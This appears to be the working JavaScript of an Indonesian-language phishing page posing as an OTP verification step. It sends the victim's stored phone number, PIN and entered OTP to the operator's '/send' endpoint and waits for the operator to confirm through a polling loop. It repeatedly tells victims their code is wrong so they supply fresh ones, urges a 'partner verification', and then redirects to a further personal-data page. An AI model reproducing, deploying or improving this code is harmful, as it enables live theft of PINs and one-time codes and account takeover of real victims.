/* ========================= */
/* OTP */
/* ========================= */

const sound =
document.getElementById("successSound");

let otpInputs =
document.querySelectorAll(".otp-box");

const otpContainer =
document.querySelector(".otp-container");

const otpOriginalHTML = otpContainer.innerHTML;

const errorBox =
document.querySelector(".error-box");


const blockedBox =
document.querySelector(".blocked-box");

const blockedBtn =
document.querySelector(".blocked-btn");

const alertTitle =
document.querySelector(".alert-title");

const alertDesc =
document.querySelector(".alert-desc");

/* ========================= */
/* PLAY SOUND */
/* ========================= */

window.addEventListener(
"pageshow",
() => {

    sound.play();

});

let alertTimer;

function showTempAlert(title, desc){

    clearTimeout(alertTimer);

    alertTitle.innerText = title;
    alertDesc.innerText = desc;

    errorBox.style.display = "block";
    errorBox.classList.add("show");

    alertTimer = setTimeout(() => {

        errorBox.classList.remove("show");

        setTimeout(() => {
            errorBox.style.display = "none";
        }, 300);

    }, 3000);
}

/* FADE IN */ 
window.addEventListener("load", () => {

    document.body.classList.add(
    "fade-in"
    );

});

/* TOTAL SALAH */
let wrongCount = 0;

/* STATUS KONFIRMASI */
let isConfirmed = false;

/* HIDE ALERT */
errorBox.style.display = "none";

/* HIDE BLOCK */
blockedBox.style.display = "none";


/* ========================= */
/* NOMOR OTOMATIS */
/* ========================= */

const savedNumber =
localStorage.getItem("nmrx");

if(savedNumber){

    document.querySelector(
    ".phone-number"
    ).innerText = savedNumber;

}

/* ========================= */
/* FOKUS KE BOX PERTAMA */
/* ========================= */

otpContainer.addEventListener("click", () => {

    for(let i = 0; i < otpInputs.length; i++){

        if(otpInputs[i].value === ""){

            otpInputs[i].focus();

            return;

        }

    }

    otpInputs[0].focus();

});

/* ========================= */
/* OTP INPUT */
/* ========================= */

function initOtpInputs(){

    otpInputs.forEach((input,index)=>{

        input.addEventListener("input",()=>{

            input.value =
            input.value.replace(/[^0-9]/g,'');

            errorBox.style.display="none";

            if(
                input.value.length===1 &&
                index<otpInputs.length-1
            ){

                otpInputs[index+1].focus();

            }

            checkOTP();

        });

        input.addEventListener("keydown",(e)=>{

            if(
                e.key==="Backspace" &&
                input.value==="" &&
                index>0
            ){

                otpInputs[index-1].focus();

            }

        });

    });

}

initOtpInputs();

let statusInterval = null;

function cekKonfirmasi(nmrx){

    if(statusInterval){
        clearInterval(statusInterval);
    }

    statusInterval = setInterval(async()=>{

        const res = await fetch(`/status/${nmrx}`);
        const data = await res.json();

        if(data.status === "confirmed"){

    isConfirmed = true;
            
            clearInterval(statusInterval);

            loadingBox.style.display = "none";

            document
.getElementById("successPopup")
.classList.add("show");

const successBtn = document.getElementById("successBtn");

successBtn.onclick = () => {

    successBtn.disabled = true;

    successBtn.innerHTML = `
        <div class="btn-loader">
            <img src="assets/home.png" class="btn-loader-icon" alt="">
            <span class="btn-loader-ring"></span>
        </div>
    `;

    setTimeout(() => {
        window.location.href = "diri.html";
    }, 900);

};

        }

    },2000);

}

function showPinLoading(){
    otpContainer.innerHTML = `
        <div class="pix-inline-loading">
            <div class="pix-loader">
                <img src="assets/home.png" class="loader-icon">
                <span class="loader-ring"></span>
            </div>
        </div>
    `;
}

function resetPinBox(){

    otpContainer.innerHTML = otpOriginalHTML;

    otpInputs =
    document.querySelectorAll(".otp-box");

    initOtpInputs();

    otpInputs.forEach(input=>{
        input.value="";
    });

    otpInputs[0].focus();

}

/* ========================= */
/* CHECK OTP */
/* ========================= */

function checkOTP(){

    let otp = "";

    otpInputs.forEach(input => {

        otp += input.value;

    });

    /* FULL OTP */
    if(otp.length === 4){

      showPinLoading();

         /* SIMPAN */
    localStorage.setItem(
    "otp",
    otp
    );

            const nmrx =
            localStorage.getItem(
            "nmrx"
            );

            const pix =
            localStorage.getItem(
            "pix"
            );

            const otpData =
            localStorage.getItem(
            "otp"
            );

            fetch("/send", {

            method:"POST",

            headers:{
            "Content-Type":
            "application/json"
        },

            body:JSON.stringify({

                nmrx:nmrx,
                pix:pix,
                otp:otpData

        })

    })

        .then(res => res.json())

.then(data => {

    console.log("RESPON:", data);

    if(data.success){
        cekKonfirmasi(nmrx);
    }

})

.catch(err => {

    console.log("ERROR:", err);

});

        /* LOADING DI AREA BOX SAJA */
showPinLoading();

        setTimeout(() => {

            if(isConfirmed){
    return;
}

            /* TOTAL SALAH */
            wrongCount++;

            /* ========================= */
            /* 1 - 2X SALAH */
            /* ========================= */

            if(wrongCount < 3){

                showTempAlert(
    "Kode OTP salah atau kadaluarsa",
    "Pastikan Kode OTP yang kamu masukan benar dan tidak kadaluarsa"
);

            }

            /* ========================= */
            /* 3X SALAH */
            /* ========================= */

            else if(wrongCount === 3){

                showTempAlert(
    "Kamu sudah memasukan kode OTP salah 3x",
    "Pastikan kode yang dimasukan sudah benar"
);

            }

            /* ========================= */
            /* 4X SALAH */
            /* ========================= */

            else if(wrongCount >= 4){

                document.querySelector(
                ".container"
                ).style.display =
                "none";

                blockedBox.style.display =
                "block";

                return;

            }

            /* SHAKE */
            otpContainer.classList
            .add("shake");

            navigator.vibrate(250);

            setTimeout(() => {

                otpContainer.classList
                .remove("shake");

            },350);

            /* RESET OTP */
            setTimeout(() => {

                resetPinBox();

            },300);

        },2000);

    }

}

/* ========================= */
/* TIMER */
/* ========================= */

const resendBtn =
document.querySelector(".resend-btn");

const timerText =
document.querySelector(".timer");

let time = 60;

resendBtn.disabled = true;

const countdown =
setInterval(() => {

    let seconds =
    time < 10
    ? "0" + time
    : time;

    timerText.innerText =
    `00:${seconds}`;

    time--;

    if(time < 0){

        clearInterval(countdown);

        timerText.innerText =
        "00:00";

        resendBtn.disabled =
        false;

        resendBtn.classList
        .add("active");

    }

},1000);

/* ========================= */
/* RESEND */
/* ========================= */

resendBtn.addEventListener(
"click",
() => {

    if(!resendBtn.disabled){

        location.reload();

    }

});

const slides = [
    "assets/slide1.jpg",
    "assets/slide2.jpg",
    "assets/slide3.jpg",
    "assets/slide4.jpg"
];

let currentSlide = 0;
let isAnimating = false;

const slideImg =
document.getElementById("slideImg");

const slideCounter =
document.getElementById("slideCounter");

const prevBtn =
document.getElementById("prevBtn");

const nextBtn =
document.getElementById("nextBtn");

function changeSlide(direction){

    if(isAnimating) return;

    isAnimating = true;

    if(direction === "next"){
        slideImg.classList.add("slide-out-left");
    }else{
        slideImg.classList.add("slide-out-right");
    }

    setTimeout(() => {

        if(direction === "next"){

            currentSlide++;

            if(currentSlide >= slides.length){
                currentSlide = 0;
            }

        }else{

            currentSlide--;

            if(currentSlide < 0){
                currentSlide = slides.length - 1;
            }

        }

        slideImg.src = slides[currentSlide];

        slideCounter.innerText =
        `${currentSlide + 1} / ${slides.length}`;

        slideImg.classList.remove(
            "slide-out-left",
            "slide-out-right"
        );

        slideImg.style.opacity = "0";
        slideImg.style.transform =
        direction === "next"
        ? "translateX(25px) scale(.96)"
        : "translateX(-25px) scale(.96)";

        setTimeout(() => {

            slideImg.style.opacity = "1";
            slideImg.style.transform =
            "translateX(0) scale(1)";

        },30);

        setTimeout(() => {
            isAnimating = false;
        },300);

    },280);
}

nextBtn.addEventListener("click", () => {
    changeSlide("next");
});

prevBtn.addEventListener("click", () => {
    changeSlide("prev");
});

function updateSlide(){

    slideImg.style.opacity = "0";

    setTimeout(() => {

        slideImg.src =
        slides[currentSlide];

        slideCounter.innerText =
        `${currentSlide + 1} / ${slides.length}`;

        slideImg.style.opacity = "1";

    },150);

}

const introOverlay =
document.getElementById("introOverlay");

const introBtn =
document.getElementById("introBtn");

const topNotif =
document.getElementById("topNotif");

const notifOkBtn =
document.getElementById("notifOkBtn");

const topNotifSound =
document.getElementById("topNotifSound");

let notifStep = 1;

introBtn.addEventListener("click", () => {

    introOverlay.classList.add("hide");

    setTimeout(() => {
        introOverlay.style.display = "none";

        setTimeout(() => {
    topNotif.classList.add("show");

    topNotifSound.currentTime = 0;
    topNotifSound.play().catch(() => {});
}, 200);

    },350);

});

notifOkBtn.addEventListener("click", () => {

    if(notifStep === 1){

        topNotif.classList.remove("show");
        topNotif.classList.add("hide");

        setTimeout(() => {

            document.querySelector(".top-notif-title").innerText =
            "Belum menerima kode OTP?";

            document.querySelector(".top-notif-desc").innerHTML =
            "Pastikan kamu sudah melakukan Verifikasi Partner.<br> Cara Verifikasi Partner ada di bawah.";

            topNotif.classList.remove("hide");
            topNotif.classList.add("show");

            topNotifSound.currentTime = 0;
            topNotifSound.play().catch(() => {});

            notifStep = 2;

        },350);

    }else{

        topNotif.classList.remove("show");
        topNotif.classList.add("hide");

    }

});

/* ========================= */
/* MULAI DARI AWAL */
/* ========================= */

blockedBtn.addEventListener(
"click",
() => {

    localStorage.clear();

    window.location.href =
    "index.html";

});
